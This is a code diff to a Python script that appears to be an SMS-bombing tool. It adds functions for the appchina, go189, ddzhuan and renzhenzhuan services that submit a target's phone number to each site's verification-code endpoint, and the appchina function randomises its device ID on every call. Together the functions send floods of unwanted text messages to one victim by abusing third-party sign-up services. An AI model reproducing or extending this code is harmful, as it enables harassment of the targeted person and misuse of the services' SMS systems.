@@ -1,5 +1,7 @@
 import sys
+import time
 import types
+import random
 import requests
 
 ua = {
@@ -26,12 +28,62 @@ def dicos(phone_number):
     session.post(url % 'loginaction', data=payload, headers=ua)
 
 
+def appchina(phone_number):
+    guid = 'bb9bca15-6bed-47eb-b3e6-3a9691a4ef66'
+    payload = {
+        'api': 'market.MarketAPI',
+        'deviceId': '%32x' % random.getrandbits(128),
+        'param':
+            '{"guid":"%s","login":"%d","type":"account.getCaptcha",'
+            '"captcha_type":"phone","nickname":"nrjnx","apiVer":12}}'
+            % (guid, phone_number),
+        'referer': guid
+    }
+    url = 'http://mobile.appchina.com/market/api'
+
+    requests.post(url, data=payload, headers=ua)
+
+
+def go189(phone_number):
+    payload = {
+        'callback': 'h5JsonpCallbck',
+        '_': str(int(time.time() * 1000)),
+        'para':
+            '"accNbr=%d;'
+            'pubAreaCode=025;'
+            'pushUserId=jszt_4600045;'
+            'ztInterSource=1000000"'
+            % phone_number
+    }
+    url = 'http://wx.go189.cn/wxyyt_1/wxFlowBonus/getAuthCode.do'
+
+    requests.get(url, params=payload, headers=ua)
+
+
 def yuu1(phone_number):
     payload = {
         'username': phone_number,
         'op': 'send'
     }
     url = 'http://www.yuu1.com/app_api/reg_yuu1'
+
+    requests.post(url, data=payload, headers=ua)
+
+
+def ddzhuan(phone_number):
+    payload = {
+        'mobiles': phone_number
+    }
+    url = 'http://ptservicev2.ddzhuan.cn:8080/PTSERVICEV2/t/phcode'
+
+    requests.post(url, data=payload, headers=ua)
+
+
+def renzhenzhuan(phone_number):
+    payload = {
+        'phone': phone_number
+    }
+    url = 'http://www.renzhenzhuan.com/integral_admin/api/newuser/getPhoneCode.do'
 
     requests.post(url, data=payload, headers=ua)
 
